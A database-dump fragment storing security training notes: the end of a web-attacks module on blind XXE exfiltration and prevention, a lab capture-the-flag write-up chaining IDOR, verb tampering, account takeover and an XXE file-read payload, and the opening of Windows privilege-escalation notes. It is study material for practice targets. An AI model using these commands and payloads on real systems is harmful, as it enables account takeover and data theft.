10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

The app never showed us anything — but it sent the file to us. The decoded content of `/etc/passwd` appears in our PHP server logs.

> **Tip:** Instead of sending base64 data as a URL query parameter, you can use **DNS OOB Exfiltration** — place the encoded data as a subdomain (e.g. `ENCODEDTEXT.our.website.com`) and capture it with `tcpdump`. This is more advanced and useful when HTTP outbound is blocked.

#### Automated OOB Exfiltration with XXEinjector

For faster and more automated exploitation, use **XXEinjector** — a Ruby tool that supports basic XXE, CDATA exfiltration, error-based XXE, and blind OOB XXE.

**Step 1 — Clone the tool:**

```shellsession
git clone https://github.com/enjoiz/XXEinjector.git
```

- `git clone <url>` downloads the tool''s repository into a local folder.

**Step 2 — Save the HTTP request from Burp to a file**

Copy the raw HTTP request and save it (e.g. `/tmp/xxe.req`). Include only the **first line of the XML body** and add `XXEINJECT` after it as a position marker for the tool:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

**Step 3 — Run the tool:**

```shellsession
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

| Flag          | Purpose                                  |
| ------------- | ---------------------------------------- |
| `--host`      | Your IP address (tun0 interface)         |
| `--httpport`  | Port your listener runs on               |
| `--file`      | Path to the saved HTTP request file      |
| `--path`      | The remote file you want to exfiltrate   |
| `--oob=http`  | Use HTTP for out-of-band exfiltration    |
| `--phpfilter` | Use PHP base64 filter to encode the file |

The tool won''t print the data directly (because it''s base64 encoded). All exfiltrated files are saved in the `Logs/` folder:

```shellsession
cat Logs/10.129.201.94/etc/passwd.log

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP...
```

- `cat <file>` prints the saved log file so you can read the recovered `/etc/passwd`.

---

### XXE Prevention

XXE vulnerabilities are primarily caused by **outdated XML libraries** rather than coding mistakes, making them easier to prevent through dependency management and safe XML configuration.

#### Avoiding Outdated Components

The most important step is keeping XML libraries up to date. For example, PHP''s `libxml_disable_entity_loader()` function is **deprecated since PHP 8.0** because it allows unsafe external entity loading. Using it in modern PHP code will trigger warnings in code editors like VSCode.

Beyond XML libraries, update any component that parses XML — including:

- API libraries like **SOAP**
- Document processors that handle **SVG images** or **PDF files**
- Any outdated **Node.js modules**

Using the latest versions of all web components greatly reduces the risk of XXE and many other web vulnerabilities.

#### Using Safe XML Configurations

Even after updating libraries, apply these XML configuration rules as a second layer of defense:

- **Disable custom DTD references** — prevents loading external document type definitions.
- **Disable external XML entities** — prevents the `SYSTEM` keyword from fetching files.
- **Disable parameter entity processing** — blocks the `%entity;` technique used in advanced attacks.
- **Disable XInclude support** — prevents another XML inclusion method from being abused.
- **Prevent entity reference loops** — stops Denial of Service attacks using recursive entities.
- **Disable runtime error display** — prevents error-based XXE exfiltration.

#### Additional Recommendations

- **Use JSON or YAML instead of XML** where possible — avoid XML-based API standards like SOAP and prefer REST (JSON-based) APIs instead.
- **Use a Web Application Firewall (WAF)** as an additional layer — but never rely on it alone, as WAFs can be bypassed.
- Safe XML configurations are a workaround, not a fix — always update your libraries first.

---

*End of Notes — Web Attacks Module (Sections 1–17)*

---

# HTB Web Challenge Writeup

## Vulnerability Chain: IDOR → HTTP Verb Tampering → Account Takeover → XXE → Flag

**Target:** `http://154.57.164.78:31956`
**Flag:** `HTB{m4573r_w3b_4774ck3r}`

---

## Overview

This challenge required chaining four distinct web vulnerabilities to capture the flag:

1. **IDOR** on the user API to enumerate all users and identify the admin
2. **IDOR** on the token API to steal the admin''s password reset token
3. **HTTP Verb Tampering** to bypass authorization on the password reset endpoint
4. **XXE Injection** on an authenticated endpoint to read `/flag.php`

Each bug on its own is limited. The power comes from the chain — each step produces exactly the piece of information or access the next step needs. This is what real-world exploitation usually looks like, and it is why reading source/JavaScript and testing every endpoint matters so much.

---

## Step 1: User Enumeration via IDOR

The application exposed a user API endpoint `/api.php/user/{id}` with no authorization check. We enumerated 100 users using a bash loop:

```bash
for i in $(seq 1 100); do
  echo "=== User $i ==="
  curl -s "http://154.57.164.78:31956/api.php/user/$i" \
    -H "Cookie: PHPSESSID=dpk5f8il07lfoth0an07qontrq; uid=74"
  echo
done
```

Command explained step by step:
- `for i in $(seq 1 100)` — `seq 1 100` prints the numbers 1 to 100, so the loop runs once per user ID `i`.
- `echo "=== User $i ==="` prints a header line so each response is easy to tell apart in the output.
- `curl -s "http://.../api.php/user/$i"` requests each user record silently (`-s`), substituting the current ID into the URL.
- `-H "Cookie: PHPSESSID=...; uid=74"` sends our **own** logged-in session cookie (our uid is 74). The endpoint only needs a valid session, not permission for that specific user — which is the IDOR.
- The trailing `echo` prints a blank line between records for readability.

**Key finding — User 52 stood out:**

```json
{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

The `company` field contained **"Administrator"** instead of a real company name, indicating a privileged account.

---

## Step 2: Token IDOR — Steal Admin''s Reset Token

The `/api.php/token/{uid}` endpoint had no authorization check. Any logged-in user could fetch any user''s password reset token:

```shellsession
curl -s "http://154.57.164.78:31956/api.php/token/52" \
  -H "Cookie: PHPSESSID=dpk5f8il07lfoth0an07qontrq; uid=74"
```

Command explained:
- `curl -s ".../api.php/token/52"` requests the reset token for **uid 52** (the admin we found in Step 1), silently.
- `-H "Cookie: ...; uid=74"` again sends our own session — we are still logged in as uid 74, yet the server hands over uid 52''s token because there is no ownership check. That is the second IDOR.

**Response:**

```json
{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
```

We now hold the admin''s valid password-reset token without ever being the admin.

---

## Step 3: HTTP Verb Tampering — Bypass Auth on reset.php

### Discovery — Reading settings.php Source Code

After accessing the admin profile page (`profile.php`) by changing our `uid` cookie to `52`, we noticed a **Settings** link in the navigation header. We fetched `settings.php` source code directly with curl:

```shellsession
curl -s "http://154.57.164.78:31956/settings.php" \
  -H "Cookie: PHPSESSID=dpk5f8il07lfoth0an07qontrq; uid=52"
```

- `-s` fetches quietly; `-H "Cookie: ...; uid=52"` sends the request with the uid cookie set to 52, so the page renders as the admin would see it.

The page returned a password change form and — crucially — the full JavaScript logic in the `<head>`:

```javascript
<script>
  function resetPassword() {
    if ($("#new_password").val() == $("#confirm_new_password").val()) {
      fetch(`/api.php/token/${$.cookie("uid")}`, {
        method: ''GET''
      }).then(function(response) {
        return response.json();
      }).then(function(json) {
        fetch(`/reset.php`, {
          method: ''POST'',
          headers: {
            ''Content-Type'': ''application/x-www-form-urlencoded''
          },
          body: `uid=${$.cookie("uid")}&token=${json[''token'']}&password=${$("#new_password").val()}`
        }).then(function(response) {
          return response.text();
        }).then(function(res) {
          $("#error_string").html(res);
        });
      });
    }
  };
</script>
```

This revealed two critical things:

1. **`/api.php/token/{uid}`** — a token fetch endpoint that reads uid from the cookie (no server-side auth)
2. **`/reset.php`** — the hidden password reset endpoint that accepts `uid`, `token`, and `password` as POST parameters

This is why **always reading page source and JavaScript is essential** — the endpoint `/reset.php` was never linked anywhere in the UI and would have been very hard to find by brute-forcing alone.

### How the Reset Flow Works

Reading the `settings.php` source code revealed the password reset flow:

```javascript
fetch(`/api.php/token/${$.cookie("uid")}`)
  .then(json => {
    fetch(`/reset.php`, {
      method: ''POST'',
      headers: { ''Content-Type'': ''application/x-www-form-urlencoded'' },
      body: `uid=${$.cookie("uid")}&token=${json[''token'']}&password=${newpass}`
    })
  })
```

In short: the page first fetches the token for the uid in the cookie, then POSTs `uid`, `token`, and the new `password` to `/reset.php`.

### The Problem

Direct POST to `reset.php` with `uid=52` returned **"Access Denied"** because the backend PHP logic checked:

```php
$_COOKIE[''uid''] === $_REQUEST[''uid'']
```

Our session cookie had `uid=74` (our own account), so the check failed for `uid=52`. In other words, the server compares the uid in our cookie to the uid in the request and refuses if they differ.

### The Bypass

PHP''s `$_REQUEST` superglobal reads from **both** `$_GET` (URL query string) **and** `$_POST` (request body). By passing the parameters as a **URL query string** instead of the POST body, with `uid=52` set in our cookie, the authorization check passed:

```shellsession
curl -s -X POST \
  "http://154.57.164.78:31956/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=hacked123" \
  -H "Cookie: PHPSESSID=at9d94qgn8s1730qh9d35qdd9o; uid=52" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Content-Length: 0"
```

Command explained step by step:
- `-s` runs quietly; `-X POST` forces the **POST** method (the endpoint expects POST).
- The parameters (`uid=52`, the stolen `token`, and `password=hacked123`) are placed in the **URL query string**, so they land in `$_GET` — and therefore in `$_REQUEST`.
- `-H "Cookie: ...; uid=52"` sets our cookie uid to 52, so `$_COOKIE[''uid''] === $_REQUEST[''uid'']` becomes `52 === 52` and passes.
- `-H "Content-Type: application/x-www-form-urlencoded"` matches what the endpoint expects.
- `-H "Content-Length: 0"` tells the server the POST **body is empty** — because we deliberately put everything in the query string instead of the body. This is the verb-tampering trick: same action, parameters moved to a place the auth logic still trusts.

**Response:**

```
Password changed successfully
```

---

## Step 4: Login as Administrator

With the password reset, we logged in as `a.corrales`:

```shellsession
curl -s -X POST "http://154.57.164.78:31956/index.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -D - \
  -d "username=a.corrales&password=hacked123" | grep "Set-Cookie"
```

Command explained:
- `-X POST .../index.php` submits the login form via POST.
- `-d "username=a.corrales&password=hacked123"` sends the admin username with the password we just set.
- `-D -` dumps the **response headers** to stdout (`-` means "to the terminal"), so we can see the session cookies the server issues.
- `| grep "Set-Cookie"` filters the output to just the `Set-Cookie` lines.

**Response:**

```
Set-Cookie: PHPSESSID=gt6iagivdv4sqnlqcb86k1o7jr; path=/
Set-Cookie: uid=52; expires=Mon, 26-Oct-2026 08:17:08 GMT; Max-Age=2592000; path=/
```

Successfully authenticated as **Amor Corrales (Administrator)**.

---

## Step 5: XXE Injection on /addEvent.php

### Discovery

As admin, the `event.php` page allowed creating events with XML data submitted to `/addEvent.php`. The XML parser had external entity processing enabled, making it vulnerable to XXE injection.

The endpoint was discovered by reading the page''s JavaScript source — always inspect JS before brute-forcing.

### Payload

We used `php://filter` to base64-encode the file contents before returning them. This prevents the XML parser from breaking on special characters (`<`, `>`, `&`) that may appear in PHP source files:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
  <name>&xxe;</name>
  <details>test</details>
  <date>2026-09-08</date>
</root>
```

How the payload works:
- `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">` defines an external entity `xxe` that reads `/flag.php` and base64-encodes it.
- `<name>&xxe;</name>` references the entity in the `name` field, which is the value echoed back in the response — so the encoded flag file is returned to us.

**Request:**

```http
POST /addEvent.php HTTP/1.1
Host: 154.57.164.78:31956
Content-Type: text/plain;charset=UTF-8
Cookie: PHPSESSID=gt6iagivdv4sqnlqcb86k1o7jr; uid=52
```

**Response:**

```
Event ''PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K'' has been created.
```

The event "name" in the response is the base64-encoded contents of `/flag.php`.

---

## Step 6: Decode the Flag

```shellsession
echo "PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K" | base64 -d
```

Command explained:
- `echo "..."` prints the base64 string returned in the response.
- `| base64 -d` **decodes** it back to the original PHP file contents.

**Output:**

```php
<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

---

## 🚩 Flag

```
HTB{m4573r_w3b_4774ck3r}
```

---

## Vulnerability Summary

| # | Vulnerability       | Endpoint               | Impact                                        |
| - | ------------------- | ---------------------- | --------------------------------------------- |
| 1 | IDOR                | `/api.php/user/{id}`   | Full user enumeration (100 users)             |
| 2 | IDOR                | `/api.php/token/{uid}` | Steal any user''s password reset token         |
| 3 | HTTP Verb Tampering | `/reset.php`           | Bypass authorization → admin account takeover |
| 4 | XXE Injection       | `/addEvent.php`        | Read arbitrary files from the server          |

---

## Key Takeaways

- **Always read JavaScript source** — it revealed hidden endpoints (`reset.php`, `addEvent.php`) and the reset flow logic.
- **IDOR isn''t just for data** — token endpoints are just as dangerous as user data endpoints.
- **HTTP Verb Tampering** exploits PHP''s `$_REQUEST`, which merges GET and POST — always test parameters in the URL query string when POST is denied.
- **XXE + php://filter** is the reliable way to read PHP files since direct file read breaks on `<?php` tags.
- **Chaining vulnerabilities** — none of these alone gave the flag; the full chain was required.', NULL, 'PUBLISHED', 'PUBLIC', 63, 'cmvfonfhr00ayida0a37aijsy', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792440342.228), to_timestamp(1792440342.228), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvfoss5y00brida0ljma7d4z', 'Windows Privilege Escalation', 'windows-privilege-escalation', 'Complete notes covering Windows privilege escalation techniques including enumeration, SeImpersonate, SeDebugPrivilege, weak permissions, kernel exploits, credential hunting, UAC bypass, DLL injection, built-in group abuse, and hardening from HTB Academy module.', '# Windows Privilege Escalation — Complete Notes

---

## Table of Contents

**1. [Introduction to Windows Privilege Escalation](#part-1-introduction-to-windows-privilege-escalation)**
- 1.1 [What is Windows Privilege Escalation](#what-is-windows-privilege-escalation)
- 1.2 [Common Privilege Escalation Attack Surface](#common-privilege-escalation-attack-surface)
- 1.3 [Scenario 1 — Overcoming Network Restrictions](#scenario-1--overcoming-network-restrictions)
- 1.4 [Scenario 2 — Pillaging Open Shares](#scenario-2--pillaging-open-shares)
- 1.5 [Scenario 3 — Hunting Credentials and Abusing Account Privileges](#scenario-3--hunting-credentials-and-abusing-account-privileges)
- 1.6 [Why Does Privilege Escalation Happen](#why-does-privilege-escalation-happen)
- 1.7 [Connecting via FreeRDP](#connecting-via-freerdp)

**2. [Useful Tools, Situational Awareness & Initial Enumeration](#part-2-useful-tools-situational-awareness--initial-enumeration)**
- 2.1 [Useful Tools](#useful-tools)
- 2.2 [Situational Awareness](#situational-awareness)
- 2.3 [Network Information](#network-information)
- 2.4 [Interfaces, IP Addresses, DNS Information](#interfaces-ip-addresses-dns-information)
- 2.5 [ARP Table](#arp-table)
- 2.6 [Routing Table](#routing-table)
- 2.7 [Enumerating Protections](#enumerating-protections)
- 2.8 [Check Windows Defender Status](#check-windows-defender-status)
- 2.9 [List AppLocker Rules](#list-applocker-rules)
- 2.10 [Test AppLocker Policy](#test-applocker-policy)
- 2.11 [Initial Enumeration](#initial-enumeration)
- 2.12 [Key Data Points](#key-data-points)
- 2.13 [System Information — Tasklist](#system-information--tasklist)
- 2.14 [Display All Environment Variables](#display-all-environment-variables)
- 2.15 [View Detailed Configuration Information — systeminfo](#view-detailed-configuration-information--systeminfo)
- 2.16 [Patches and Updates](#patches-and-updates)
- 2.17 [Installed Programs](#installed-programs)
- 2.18 [Display Running Processes — Netstat](#display-running-processes--netstat)
- 2.19 [User and Group Information](#user-and-group-information)
- 2.20 [Current User Context](#current-user-context)
- 2.21 [Current User Group Information](#current-user-group-information)
- 2.22 [Get All Users and Groups](#get-all-users-and-groups)
- 2.23 [Get Password Policy and Other Account Information](#get-password-policy-and-other-account-information)

**3. [Communication with Processes, Windows Privileges, SeImpersonate, SeDebugPrivilege & SeTakeOwnership](#part-3-communication-with-processes-windows-privileges-overview-seimpersonate-sedebugprivilege--setakeownership)**
- 3.1 [Communication with Processes](#communication-with-processes)
- 3.2 [Access Tokens](#access-tokens)
- 3.3 [Enumerating Network Services](#enumerating-network-services)
- 3.4 [Named Pipes](#named-pipes)
- 3.5 [Reviewing Named Pipe Permissions](#reviewing-named-pipe-permissions)
- 3.6 [Named Pipes Attack Example — WindscribeService](#named-pipes-attack-example--windscribeservice)
- 3.7 [Windows Privileges Overview](#windows-privileges-overview)
- 3.8 [Windows Authorization Process](#windows-authorization-process)
- 3.9 [Rights and Privileges in Windows — Key Groups](#rights-and-privileges-in-windows--key-groups)
- 3.10 [User Rights Assignment — Key Privileges](#user-rights-assignment--key-privileges)
- 3.11 [Local Admin User Rights — Elevated vs Standard](#local-admin-user-rights--elevated-vs-standard)
- 3.12 [SeImpersonate and SeAssignPrimaryToken](#seimpersonate-and-seassignprimarytoken)
- 3.13 [SeImpersonate Example — JuicyPotato](#seimpersonate-example--juicypotato)
- 3.14 [PrintSpoofer and RoguePotato](#printspoofer-and-roguepotato)
- 3.15 [SeDebugPrivilege](#sedebugprivilege)
- 3.16 [Dumping LSASS with ProcDump](#dumping-lsass-with-procdump)
- 3.17 [Extracting Credentials with Mimikatz](#extracting-credentials-with-mimikatz)
- 3.18 [Remote Code Execution as SYSTEM via SeDebugPrivilege](#remote-code-execution-as-system-via-sedebugprivilege)
- 3.19 [SeTakeOwnershipPrivilege](#setakeownershipprivilege)
- 3.20 [Leveraging SeTakeOwnershipPrivilege](#leveraging-setakeownershipprivilege)
- 3.21 [Files of Interest for SeTakeOwnership](#files-of-interest-for-setakeownership)

**4. [Windows Built-in Groups](#part-4-windows-built-in-groups--backup-operators-event-log-readers-dnsadmins-hyper-v-administrators-print-operators--server-operators)**
- 4.1 [Windows Built-in Groups](#windows-built-in-groups)
- 4.2 [Backup Operators](#backup-operators)
- 4.3 [Attacking a Domain Controller — Copying NTDS.dit](#attacking-a-domain-controller--copying-ntdsdit)
- 4.4 [Extracting Credentials from NTDS.dit](#extracting-credentials-from-ntdsdit)
- 4.5 [Event Log Readers](#event-log-readers)
- 4.6 [DnsAdmins](#dnsadmins)
- 4.7 [Hyper-V Administrators](#hyper-v-administrators)
- 4.8 [Print Operators](#print-operators)
- 4.9 [Server Operators](#server-operators)

**5. [User Account Control, Weak Permissions, Kernel Exploits & Vulnerable Services](#part-5-user-account-control-weak-permissions-kernel-exploits--vulnerable-services)**
- 5.1 [User Account Control](#user-account-control)
- 5.2 [Weak Permissions](#weak-permissions)
- 5.3 [Permissive File System ACLs](#permissive-file-system-acls)
- 5.4 [Weak Service Permissions](#weak-service-permissions)
- 5.5 [Unquoted Service Path](#unquoted-service-path)
- 5.6 [Kernel Exploits](#kernel-exploits)
- 5.7 [HiveNightmare — CVE-2021-36934](#hivenightmare--cve-2021-36934)
- 5.8 [PrintNightmare — CVE-2021-1675](#printnightmare--cve-2021-1675)
- 5.9 [Vulnerable Services — Druva inSync Example](#vulnerable-services--druva-insync-example)

**6. [DLL Injection, Credential Hunting, Interacting with Users & Pillaging](#part-6-dll-injection-credential-hunting-further-credential-theft-citrix-breakout-interacting-with-users--pillaging)**
- 6.1 [DLL Injection](#dll-injection)
- 6.2 [DLL Hijacking](#dll-hijacking)
- 6.3 [Credential Hunting](#credential-hunting)
- 6.4 [Interacting with Users](#interacting-with-users)

**7. [Miscellaneous Techniques, Legacy OS, Case Studies & Hardening](#part-7-miscellaneous-techniques-legacy-operating-systems-windows-server--desktop-case-studies--windows-hardening)**
- 7.1 [Miscellaneous Techniques — LOLBAS](#miscellaneous-techniques--lolbas)
- 7.2 [Always Install Elevated](#always-install-elevated)
- 7.3 [Scheduled Tasks](#scheduled-tasks)
- 7.4 [Mount VHDX/VMDK](#mount-vhdxvmdk)
- 7.5 [Legacy Operating Systems](#legacy-operating-systems)
- 7.6 [Windows Server 2008 Case Study](#windows-server-2008-case-study)
- 7.7 [Windows 7 Case Study](#windows-7-case-study)
- 7.8 [Windows Hardening](#windows-hardening)

---

# Part 1: Introduction to Windows Privilege Escalation

---

## What is Windows Privilege Escalation

After gaining a foothold on a Windows system, elevating our privileges provides more options for persistence and may reveal information stored locally that can further our access within the environment. The general goal of Windows privilege escalation is to reach the Local Administrators group or the NT AUTHORITY\SYSTEM account, which is a LocalSystem account with even more privileges than a local administrator. There may be scenarios where escalating to another user on the system is enough to reach our goal. Privilege escalation is typically a vital step during any engagement because we need the access obtained or some data like credentials found only once we have a session in an elevated context. In some cases privilege escalation may be the ultimate goal of the assessment if our client hires us for a gold image or workstation breakout type assessment. Privilege escalation is often vital to continue through a network towards our ultimate objective as well as for lateral movement.

We may need to escalate privileges for one of the following reasons — testing a client''s gold image for flaws, escalating locally to gain access to local resources such as a database, gaining SYSTEM-level access on a domain-joined machine to get a foothold into Active Directory, or obtaining credentials to move laterally or escalate further within the client''s network. There are many tools available to assist with privilege escalation but it is also essential to understand how to perform privilege escalation checks and leverage flaws manually. We may run into situations where a client places us on a managed workstation with no internet access, heavily firewalled, and USB ports disabled so we cannot load any tools or helper scripts. In this instance having a firm grasp of Windows privilege escalation checks using both PowerShell and Windows command-line would be crucial.

---

## Common Privilege Escalation Attack Surface

Windows systems present a vast attack surface for privilege escalation. The methods include abusing Windows group privileges, abusing Windows user privileges, bypassing User Account Control, abusing weak service or file permissions, leveraging unpatched kernel exploits, credential theft, traffic capture, and many more. Just some of the ways we can escalate are shown in this non-exhaustive list and throughout this module we will cover most of these methods with practical examples. The key thing to understand is that no single technique works everywhere — real-world assessments require combining multiple techniques and thinking creatively about how to chain low-level findings into full privilege escalation paths.

---

## Scenario 1 — Overcoming Network Restrictions

In this real-world scenario the tester was given a client-provided system with no internet access and blocked USB ports. Due to network access control the tester could not plug their attack machine directly into the user network. During the assessment the tester had already found a network flaw in which the printer VLAN was configured to allow outbound communication over ports 80, 443, and 445. Using manual enumeration methods the tester found a permissions-related flaw that allowed privilege escalation and performed a manual memory dump of the LSASS process. From there the tester was able to mount an SMB share hosted on their attack machine on the printer VLAN and exfiltrate the LSASS dump file. With this file in hand they used Mimikatz offline to retrieve the NTLM password hash for a domain admin which they could crack offline and use to access a domain controller from the client-provided system. This scenario demonstrates why manual enumeration skills are essential and why we should never rely solely on tools.

---

## Scenario 2 — Pillaging Open Shares

During another assessment the tester found themselves in a locked-down environment that was well monitored and without any obvious configuration flaws or vulnerable services in use. They found a wide-open file share allowing all users to list its contents and download files stored on it. This share was hosting backups of virtual machines in the environment. The tester was explicitly interested in virtual hard drive files like .VMDK and .VHDX files. They could access this share from a Windows VM, mount the .VHDX virtual hard drive as a local drive, and browse the file system. From there they retrieved the SYSTEM, SAM, and SECURITY registry hives, moved them to their Linux attack box, and extracted the local administrator password hash using the secretsdump.py tool. The organization happened to be using a gold image and the local administrator hash could be used to gain admin access to nearly every Windows system via a pass-the-hash attack.

---

## Scenario 3 — Hunting Credentials and Abusing Account Privileges

In this final scenario the tester was placed in a rather locked-down network with the goal of accessing critical database servers. The client provided a laptop with a standard domain user account and the tester could load tools onto it. They eventually ran the Snaffler tool to hunt file shares for sensitive information and came across some .sql files containing low-privileged database credentials to a database on one of the database servers. They used an MSSQL client locally to connect to the database using the database credentials, enabled the xp_cmdshell stored procedure and gained local command execution. Using this access as a service account they confirmed that they had the SeImpersonatePrivilege which can be leveraged for local privilege escalation. They downloaded a custom compiled version of Juicy Potato to the host to assist with privilege escalation and were able to add a local admin user. With this access they were able to remote into the database host and gain complete control of the company''s database.

---

## Why Does Privilege Escalation Happen

There is no one reason why a company''s hosts may fall victim to privilege escalation but several possible underlying causes exist. Many organizations simply do not have the personnel to properly keep up with patching, vulnerability management, periodic internal assessments, continuous monitoring, and larger resource-intensive initiatives. Such initiatives may include workstation and server upgrades as well as file share audits to lock down directories and secure or remove sensitive files such as scripts or configuration files containing credentials. The combination of staffing shortages, budget limitations, and the complexity of Windows environments creates many opportunities for attackers to find and exploit privilege escalation flaws.

---

## Connecting via FreeRDP

Throughout the module we will connect to target VMs using RDP. We can connect via command line using xfreerdp and typing in the provided password when prompted. Most sections provide credentials for the htb-student user but some will have different users with alternate credentials provided. Many module sections require tools such as open-source scripts, precompiled binaries, and exploit PoCs which can be found in the C:\Tools directory on the target host.

```bash
$ xfreerdp /v:10.129.43.36 /u:htb-student

[21:17:27:323] [28158:28159] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Do you trust the above certificate? (Y/T/N) y
Password:
```

---

# Part 2: Useful Tools, Situational Awareness & Initial Enumeration

---

## Useful Tools

There are many tools available to assist with enumerating Windows systems for common and obscure privilege escalation vectors. While tools are extremely helpful in narrowing down our checks and focusing our enumeration, we should strive to learn what each tool does so we can perform checks manually when we cannot load them. Tools can be a double-edged sword because they help speed up enumeration but could make us less efficient if we do not know how to read the output or narrow it down to the most interesting data points. Tools can also produce false positives so we must have a deep understanding of many possible privilege escalation techniques to troubleshoot when things go wrong.

**Key tools to know:**

| Tool | Description |
|------|-------------|
| **Seatbelt** | C# project for performing a wide variety of local privilege escalation checks |
| **winPEAS** | Script that searches for possible paths to escalate privileges on Windows hosts |
| **PowerUp** | PowerShell script for finding common Windows privilege escalation vectors relying on misconfigurations |
| **SharpUp** | C# version of PowerUp |
| **JAWS** | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0 |
| **SessionGopher** | PowerShell tool that finds and decrypts saved session information for PuTTY, WinSCP, FileZilla, and RDP |
| **Watson** | .NET tool designed to enumerate missing KBs and suggest exploits for privilege escalation |
| **LaZagne** | Tool for retrieving passwords stored on a local machine from browsers, chat tools, databases, and more |
| **WES-NG** | Based on systeminfo output, provides the list of vulnerabilities the OS is vulnerable to |
| **Sysinternals Suite** | Microsoft toolkit containing AccessChk, PipeList, PsService, and many other useful tools |

It is recommended to always compile tools from source if using them in a client environment. When we cannot find many writable directories to upload tools it is always a safe bet to upload to C:\Windows\Temp because the BUILTIN\Users group has write access there. Most of these tools are well known and will be detected and blocked by common antivirus solutions and most certainly by more advanced EDR products such as Cylance or Carbon Black. For example uploading the precompiled LaZagne binary to VirusTotal shows that 47 out of 70 products detect it as malicious. During evasive engagements we may need to modify tools to bypass detection by removing comments, changing function names, or encrypting the executable.

---

## Situational Awareness

When placed in any situation whether in our day-to-day lives or during a network penetration test it is always important to orient ourselves in space and time. We cannot function and react effectively without an understanding of our current surroundings. We require this information to make informed decisions about our next steps and to operate proactively instead of reactively. When we land on a Windows system intending to escalate privileges there are several things we should always look for to plan out our next moves. We may find other hosts that we can access directly, protections in place that will need to be bypassed, or find that certain tools will not work against the system in question.

---

## Network Information

Gathering network information is a crucial part of our enumeration. We may find that the host is dual-homed meaning it belongs to two or more different networks and in most cases has several virtual or physical network interfaces. Compromising a dual-homed host may allow us to move laterally into another part of the network that we could not access previously. We should always look at routing tables to view information about the local network and networks around it. We can also gather information about the local domain if the host is part of an Active Directory environment including the IP addresses of domain controllers. It is also important to use the arp command to view the ARP cache for each interface and view other hosts the host has recently communicated with which could help us with lateral movement after obtaining credentials.

---

## Interfaces, IP Addresses, DNS Information

The ipconfig /all command shows all network interfaces, their IP addresses, subnet masks, default gateways, DNS servers, and other configuration details. This tells us how many network connections the host has and which networks it belongs to. Multiple adapters with different subnets indicate a dual-homed host. The DNS servers listed help us understand name resolution and may point to domain controllers in an Active Directory environment.

```cmd
C:\htb> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WINLPE-SRV01
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   DNS Suffix Search List. . . . . . : .htb

Ethernet adapter Ethernet1:

   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   IPv4 Address. . . . . . . . . . . : 192.168.20.56(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.20.1
   DNS Servers . . . . . . . . . . . : 8.8.8.8

Ethernet adapter Ethernet0:

   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   IPv4 Address. . . . . . . . . . . : 10.129.43.8(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
```

---

## ARP Table

The ARP table shows the mapping of IP addresses to MAC addresses for hosts the machine has recently communicated with. This helps us identify other live hosts on the network and potential targets for lateral movement. Entries marked as dynamic were learned through actual communication while static entries are permanent. This information is a good indication of which hosts administrators are connecting to via RDP or WinRM from this host.

```cmd
C:\htb> arp -a

Interface: 10.129.43.8 --- 0x4
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-4d-df     dynamic
  10.129.43.12          00-50-56-b9-da-ad     dynamic
  10.129.43.13          00-50-56-b9-5b-9f     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static

Interface: 192.168.20.56 --- 0x9
  Internet Address      Physical Address      Type
